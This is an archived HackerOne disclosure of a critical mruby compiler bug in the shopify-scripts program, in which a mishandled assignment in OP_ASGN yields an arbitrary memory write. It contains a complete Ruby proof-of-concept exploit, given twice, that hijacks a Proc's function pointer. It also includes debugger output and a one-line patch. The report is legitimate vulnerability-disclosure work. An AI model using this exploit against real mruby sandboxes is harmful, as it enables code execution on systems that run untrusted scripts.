---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/write-what-where-condition
  - env/web
substate: "resolved"
weakness: "Write-what-where Condition"
enriched: true
date: 2017-05-30
submitted: 2017-05-04T21:23:52.791Z
bounty_usd: null
votes: 3
cve: []
program: "[[programs/shopify-scripts|shopify-scripts]]"
reporter: "avisaven"
source: "https://hackerone.com/reports/226200"
title: "OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write"
---
# OP_SCALL in LHS of a OP_ASGN resulting in arbitrary memory write

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 3 | **Program:** shopify-scripts | **Disclosed:** 2017-05-30

- Report: [https://hackerone.com/reports/226200](https://hackerone.com/reports/226200)
- CWE: Write-what-where Condition
- Submitted: 2017-05-04T21:23:52.791Z

## Report summary

Improper code generation and error handling in OP_ASGN leads to arbitrary memory write and code execution.

## Timeline

- **Report Filed**
- **2017-05-04** @shopify-scripts: Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.

Due to the large volume of reports we have received, it may take us up to three weeks to respond. Thank you for your patience!
- **2017-05-06** @avisaven: Attached below is a PoC that gets code execution

    # Setting up our helper functions.  Inspiration and a few code snippets taken
    # from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)

    def hexchartonum(h)
      numbase = "0".getbyte(0)
      letterbase = "a".getbyte(0)
      if h < (numbase + 10)
        return h - numbase
      else
        return h - letterbase + 10
      end
    end

    def numtohexchar(b)
      numbase = "0".getbyte(0)
      letterbase = "a".getbyte(0)
      if b < 10
        return b + numbase
      else
        return b - 10 + letterbase
      end
    end

    def hextobytes(h)
      p = "\x00"*6
      6.times do |i|
        idx = i*2
        b = hexchartonum(h.getbyte(idx))
        b *= 16
        b += hexchartonum(h.getbyte(idx + 1))
        p.setbyte(5-i,b)
      end
      return p
    end

    def bytestoint(p)
      n = 0
      4.times do |i|
        n += p.getbyte(i) * (256**i)
      end
      return n
    end

    def inttobytes(n)
      p = "\x00"*4
      4.times do |i|
        b = n% 256
        p.setbyte(i,b)
        n = n/256
      end
      return p
    end

    def write(s, b, o=0)
      b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}
    end

    def addtostr(str, n)
      str = str.dup
      write(str, inttobytes(bytestoint(str.slice(0,4))+n))
      return str
    end

    # This is the heart of the exploit - our "clunky" write primitive.
    def w(addr, value)
      # This string is just small enough for its entire contents to be embedded
      # in the RString.  This is good, since it gives us basically complete control
      # over the RString's contents.
      #
      # We use this complete control to impersonate an RArray.
      # We start out with zeroes to make sure the length of the "RArray" is 0,
      # and then use large numbers for 'capa' to ensure that it won't try to realloc.
      # This string perfectly impersonates an RArray with length 0, large capa, and
      # ptr set to `addr`, which is perfect for concatenating our data into.
      x = "\x00\x00\x00\x00AAAAAAAAAAAA#{addr}"
      # Here's the kicker.  We load our fake RArray into R2, then we initiate an
      # array constructor.
      #
      # Under ordinary circumstances, an array literal will push the elements of the
      # array onto the stack one at a time, then construct the array from the elements
      # all at once.
      #
      # However, if you splat another array into an array literal, the array literal
      # construction will "cut off".  It will construct a temporary array to hold
      # the items collected so far, then it will add further elements using ARYCAT
      # for splats and ARYPUSH otherwise.
      #
      # However, when, in place of a value, we use an assignment with unknown lhs,
      # such as `_&.__=0x34343434`, this causes the stack to fail to get pushed.
      # Two things happen as a result of the stack being one less than it should be.
      #
      # 1. Instead of containing [_&.__=0x34343434,value], the inner array is actually
      # created using the temporary array that it was intending to concatenate onto.
      # As a result, the inner array is generated containing [[], value].
      #
      # 2. Instead of being concatenated onto the temporary array, the inner array
      # is concatenated directly onto R2, i.e. `a`, which is currently holding our
      # RString impersonating an RArray.  Oops ;)
      a=x
      a = [*([_&.__=0x34343434,value])]
    end

    $overwritestr = "This string is long enough to not be counted as an embed."
    # By modifying the string after creating it, we disable the sharing flag.
    $overwritestr.setbyte(0,41)

    # Now we want to locate the address of a string.  We'll do so by taking the
    # absolute address of this proc and computing an offset using the object_id
    # method.  This will also handily set up a proc for us to corrupt later.
    $proc = Proc.new{|a|a*2}
    $procid = $proc.object_id^13
    $strid = $overwritestr.object_id^16
    $diff = $strid - $procid
    $prochexaddr = $proc.to_s.byteslice(9,12)
    $procaddr = hextobytes($prochexaddr)
    $straddr = addtostr($procaddr, $diff)

    # Now we use our "clunky" write primitive to corrupt the string.  We write in
    # this way to put the address of proc in exactly the RString 'ptr' field.
    # However, our write primitive is "clunky", so it cannot write anything user-controlled
    # without writing some garbage first, and, at best, we can only control every
    # other 8 bytes.  It just so happens that the layout of data in an empty array
    # and the layout of the RString struct are helpfully organized so that we can
    # get a good number in the len field and also write to the ptr field without
    # corrupting too much other data.
    w(addtostr($straddr,24),$proc)

    # After corrupting $overwritestr, its ptr is now equal to the address of the
    # RProc structure. We can now freely use setbyte() calls on the str to modify
    # the RProc with perfect precision.
    write($overwritestr, "\xFF\xFF",1) # Setting all flags to make it a CFunc
    write($overwritestr, "AAAAAAAA", 24) # The address to call

    $proc.call # Winner winner chicken dinner :)

GDB analysis:

	Process 25597 stopped
	* thread #1: tid = 0xa1bdd, 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
	    frame #0: 0x0000000100205c34 mruby`mrb_vm_exec(mrb=0x000061400000fe40, proc=0x000062f00000a480, pc=0x00000001003d93c0) + 58884 at vm.c:1390
	   1387
	   1388	      /* prepare stack */
	   1389	      if (MRB_PROC_CFUNC_P(m)) {
	-> 1390	        recv = m->body.func(mrb, recv);
	   1391	        mrb_gc_arena_restore(mrb, ai);
	   1392	        if (mrb->exc) goto L_RAISE;
	   1393	        /* pop stackpos */
	(lldb) print m->body.func
	(mrb_func_t) $1 = 0x4141414141414141
- **2017-05-06** @avisaven: Here's a patch to fix the bug

    diff --git a/mrbgems/mruby-compiler/core/codegen.c b/mrbgems/mruby-compiler/core/codegen.c
    index f863ef33..d04ff44b 100644
    --- a/mrbgems/mruby-compiler/core/codegen.c
    +++ b/mrbgems/mruby-compiler/core/codegen.c
    @@ -1026,7 +1026,7 @@ gen_assignment(codegen_scope *s, node *tree, int sp, int val)
     #ifndef MRB_DISABLE_STDIO
         fprintf(stderr, "unknown lhs %d\n", type);
     #endif
    -    return;
    +    break;
       }
       if (val) push();
     }
- **2017-05-07** @avisaven: If you are having trouble executing the above PoC, on some compilers the .to_s method for Procs works differently. This version of the PoC should fix that:

	# Setting up our helper functions.  Inspiration and a few code snippets taken
	# from the lovely write-up by isra17 at https://hackerone.com/reports/181321 :)

	def hexchartonum(h)
	  numbase = "0".getbyte(0)
	  letterbase = "a".getbyte(0)
	  if h < (numbase + 10)
	    return h - numbase
	  else
	    return h - letterbase + 10
	  end
	end

	def numtohexchar(b)
	  numbase = "0".getbyte(0)
	  letterbase = "a".getbyte(0)
	  if b < 10
	    return b + numbase
	  else
	    return b - 10 + letterbase
	  end
	end

	def hextobytes(h)
	  p = "\x00"*6
	  6.times do |i|
	    idx = i*2
	    b = hexchartonum(h.getbyte(idx))
	    b *= 16
	    b += hexchartonum(h.getbyte(idx + 1))
	    p.setbyte(5-i,b)
	  end
	  return p
	end

	def bytestoint(p)
	  n = 0
	  4.times do |i|
	    n += p.getbyte(i) * (256**i)
	  end
	  return n
	end

	def inttobytes(n)
	  p = "\x00"*4
	  4.times do |i|
	    b = n% 256
	    p.setbyte(i,b)
	    n = n/256
	  end
	  return p
	end

	def write(s, b, o=0)
	  b.bytesize.times{|i|s.setbyte(o+i, b.getbyte(i))}
	end

	def addtostr(str, n)
	  str = str.dup
	  write(str, inttobytes(bytestoint(str.slice(0,4))+n))
	  return str
	end

	# Parse a Proc's .to_s() and add leading zeroes.
	def parseProcStr(s)
	  start = 9
	  finish = s.index('@')
	  slice = s.byteslice(start, finish-start)
	  addr = "0"*12
	  write(addr, slice, 12-slice.length)
	  return addr
	end

	# This is the heart of the exploit - our "clunky" write primitive.
	def w(addr, value)
	  # This string is just small enough for its entire contents to be embedded
	  # in the RString.  This is good, since it gives us basically complete control
	  # over the RString's contents.
	  #
	  # We use this complete control to impersonate an RArray.
	  # We start out with zeroes to make sure the length of the "RArray" is 0,
	  # and then use large numbers for 'capa' to ensure that it won't try to realloc.
	  # This string perfectly impersonates an RArray with length 0, large capa, and
	  # ptr set to `addr`, which is perfect for concatenating our data into.
	  x = "\x00\x00\x00\x00AAAAAAAAAAAA#{addr}"
	  # Here's the kicker.  We load our fake RArray into R2, then we initiate an
	  # array constructor.
	  #
	  # Under ordinary circumstances, an array literal will push the elements of the
	  # array onto the stack one at a time, then construct the array from the elements
	  # all at once.
	  #
	  # However, if you splat another array into an array literal, the array literal
	  # construction will "cut off".  It will construct a temporary array to hold
	  # the items collected so far, then it will add further elements using ARYCAT
	  # for splats and ARYPUSH otherwise.
	  #
	  # However, when, in place of a value, we use an assignment with unknown lhs,
	  # such as `_&.__=0x34343434`, this causes the stack to fail to get pushed.
	  # Two things happen as a result of the stack being one less than it should be.
	  #
	  # 1. Instead of containing [_&.__=0x34343434,value], the inner array is actually
	  # created using the temporary array that it was intending to concatenate onto.
	  # As a result, the inner array is generated containing [[], value].
	  #
	  # 2. Instead of being concatenated onto the temporary array, the inner array
	  # is concatenated directly onto R2, i.e. `a`, which is currently holding our
	  # RString impersonating an RArray.  Oops ;)
	  a=x
	  a = [*([_&.__=0x34343434,value])]
	end

	$overwritestr = "This string is long enough to not be counted as an embed."
	# By modifying the string after creating it, we disable the sharing flag.
	$overwritestr.setbyte(0,41)

	# Now we want to locate the address of a string.  We'll do so by taking the
	# absolute address of this proc and computing an offset using the object_id
	# method.  This will also handily set up a proc for us to corrupt later.
	$proc = Proc.new{|a|a*2}
	$procid = $proc.object_id^13
	$strid = $overwritestr.object_id^16
	$diff = $strid - $procid
	$prochexaddr = parseProcStr($proc.to_s)
	$procaddr = hextobytes($prochexaddr)
	$straddr = addtostr($procaddr, $diff)

	# Now we use our "clunky" write primitive to corrupt the string.  We write in
	# this way to put the address of proc in exactly the RString 'ptr' field.
	# However, our write primitive is "clunky", so it cannot write anything user-controlled
	# without writing some garbage first, and, at best, we can only control every
	# other 8 bytes.  It just so happens that the layout of data in an empty array
	# and the layout of the RString struct are helpfully organized so that we can
	# get a good number in the len field and also write to the ptr field without
	# corrupting too much other data.
	w(addtostr($straddr,24),$proc)

	# After corrupting $overwritestr, its ptr is now equal to the address of the
	# RProc structure. We can now freely use setbyte() calls on the str to modify
	# the RProc with perfect precision.
	write($overwritestr, "\xFF\xFF",1) # Setting all flags to make it a CFunc
	write($overwritestr, "AAAAAAAA", 24) # The address to call

	$proc.call # Winner winner chicken dinner :)
- **Report Triaged**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2017-05-30** @avisaven: Awesome! Thanks so much for everything!
